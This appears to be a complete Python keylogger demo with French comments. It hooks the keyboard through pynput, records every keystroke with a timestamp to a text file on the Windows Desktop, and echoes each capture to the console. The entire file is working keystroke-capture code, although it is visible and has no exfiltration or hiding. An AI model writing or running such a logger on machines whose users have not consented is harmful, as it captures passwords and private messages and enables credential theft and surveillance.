import logging
import os
import sys
import time

# 1. Configuration du fichier de logs (Sur le Bureau pour la démo)
desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
log_file = os.path.join(desktop, "KEYLOGS_FINAL.txt")

print("-" * 30)
print("   KEYLOGGER ACTIF")
print("-" * 30)
print(f"[INFO] Fichier de sortie : {log_file}")
print("[INFO] En attente de frappes... (Ne fermez pas cette fenetre)")

# 2. Configuration de l'enregistrement
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

# 3. Fonction de capture
def demarrer():
    # Importation locale pour éviter le crash si la lib manque au début
    from pynput import keyboard

    def on_press(key):
        try:
            k = str(key).replace("'", "")
            # Mise en forme
            if key == keyboard.Key.space: k = " [ESPACE] "
            elif key == keyboard.Key.enter: k = " [ENTREE]\n"
            elif key == keyboard.Key.backspace: k = " [DEL] "
            
            # Affichage console (Preuve que ça marche)
            print(f"Capture > {k}")
            # Ecriture fichier
            logging.info(k)
        except Exception as e:
            pass

    # Lancement du hook
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    demarrer()
